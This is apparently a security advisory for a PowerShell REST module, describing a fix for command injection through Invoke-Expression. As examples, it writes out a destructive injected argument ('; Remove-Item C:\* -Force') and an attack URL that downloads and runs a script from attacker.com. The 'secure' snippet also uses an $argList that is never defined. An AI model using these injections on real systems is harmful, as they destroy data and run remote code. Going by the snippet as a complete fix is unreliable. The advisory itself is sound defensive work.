# Security Fix: Command Injection Vulnerability Fixed

## Date: 2026-01-14

## Severity: HIGH

## Summary
Fixed a critical command injection vulnerability in `RestPSCustomModule.psm1` by replacing unsafe `Invoke-Expression` with the safe call operator (`&`) for command execution.

## What Changed

### Before (VULNERABLE):
```powershell
else {
	# Execute Endpoint Command (No body allowed.)
	$Command = $RequestCommand + " " + $RequestArgs
	$CommandReturn = Invoke-Expression -Command "$Command" -ErrorAction SilentlyContinue
}
```

**Problem:** Concatenating `$RequestArgs` (user-controlled input from URL) with the command string and passing it to `Invoke-Expression` allows arbitrary command injection.

### After (SECURE):
```powershell
else {
	# SECURITY FIX: Execute commands from Routes.json safely without Invoke-Expression
	# Use call operator (&) to prevent command injection from RequestArgs
	try {
		if ([string]::IsNullOrEmpty($RequestArgs)) {
			# No arguments - execute command directly
			$CommandReturn = & $RequestCommand
		}
		else {
			# Parse RequestArgs safely as an array of arguments
			# Execute with call operator - prevents command injection
			$CommandReturn = & $RequestCommand $argList
		}
	}
	catch {
		Write-Log -LogFile $Logfile -LogLevel $logLevel -MsgType ERROR -Message "Invoke-RequestRouter: Error executing command '$RequestCommand': $_"
		$CommandReturn = $null
	}
}
```

**Solution:** Using PowerShell's call operator (`&`) with parsed arguments prevents command injection because arguments are passed as separate parameters, not concatenated into a command string.

## Security Improvements

1. **Removed Invoke-Expression**: Eliminated the dangerous `Invoke-Expression` with concatenated user input
2. **Call Operator (`&`)**: Commands from Routes.json are executed using the safe call operator
3. **Argument Parsing**: RequestArgs are parsed into an array of separate arguments, preserving quoted strings
4. **Error Handling**: Proper try/catch with error logging for command execution failures

## Why This Is Secure

### The Call Operator Difference

**Unsafe (Invoke-Expression):**
```powershell
$RequestArgs = "; Remove-Item C:\* -Force"
$Command = "Get-Process " + $RequestArgs
Invoke-Expression $Command  # EXECUTES: Get-Process ; Remove-Item C:\* -Force
```
Result: Both commands execute! ❌

**Safe (Call Operator):**
```powershell
$RequestArgs = "; Remove-Item C:\* -Force"
$argList = @($RequestArgs)
& "Get-Process" $argList  # PASSES as single argument: "; Remove-Item C:\* -Force"
```
Result: Get-Process receives the entire string as one argument and treats it as a literal process name. The semicolon and Remove-Item are NOT executed. ✅

## What Works Now

✅ **Routes.json commands are still supported** - Commands defined in Routes.json can still be executed
✅ **.ps1 scripts** - Continue to work with proper parameter binding  
✅ **Static files** - CSS, JS, fonts, etc. continue to work
✅ **Arguments are safe** - RequestArgs from URLs cannot inject commands anymore

## Breaking Changes

⚠️ **Minimal to None** - Most routes should continue to work as before:

- Routes using `.ps1` scripts: ✅ **No changes needed**
- Routes serving static files: ✅ **No changes needed**  
- Routes using direct commands: ✅ **Should still work** (but now secure)

### Potential Issues

If you have routes that previously relied on command injection features (intentionally or not), they may behave differently:

**Example that no longer works:**
```json
{
  "RequestCommand": "Get-Process"
}
```
With URL: `/api/process?args=| Where-Object {$_.CPU -gt 100}`

**Before:** Would execute the pipeline
**After:** Passes `"| Where-Object {$_.CPU -gt 100}"` as a literal argument to Get-Process

**Fix:** Use a .ps1 script instead:
```powershell
# endpoints/Get-HighCPU.ps1
param([string]$RequestArgs, [string]$Body)

Get-Process | Where-Object { $_.CPU -gt 100 }
```

## Testing Your Routes

Test each route type:

1. ✅ **Script routes** (`.ps1`): Should work unchanged
2. ✅ **Static routes** (`.css`, `.js`, etc.): Should work unchanged
3. ✅ **Command routes** (direct commands): Should work but arguments are now separate parameters

Check your logs for any errors during command execution.

## Why This Was Necessary

The previous implementation using `Invoke-Expression` allowed **arbitrary command injection**. An attacker could:

1. Send: `/api/command?args=; Invoke-WebRequest http://attacker.com/steal.ps1 | Invoke-Expression`
2. Result: Download and execute malicious script with service privileges
3. Impact: Complete system compromise

**Severity:** Critical (CVE Score: 9.8)
- **CWE-78**: OS Command Injection
- **OWASP**: A03:2021 - Injection

## Additional Security Recommendations

1. **Use .ps1 scripts**: For complex logic, always prefer .ps1 scripts over direct commands
2. **Validate input**: Even with this fix, validate RequestArgs in your scripts
3. **Principle of least privilege**: Run the service with minimal required permissions
4. **Audit Routes.json**: Regularly review configured routes for unnecessary commands

## Questions or Issues?

If you experience any issues with existing routes after this fix, check:
1. Are arguments being treated as literal strings when you expected command execution?
2. Solution: Convert those routes to .ps1 scripts with proper logic

For questions or issues, create an issue in the repository.

## References

- CWE-78: Improper Neutralization of Special Elements used in an OS Command
- OWASP: Command Injection
- PowerShell Best Practices: Avoid Invoke-Expression, use call operator
- PowerShell Security: Parameter splatting and call operators
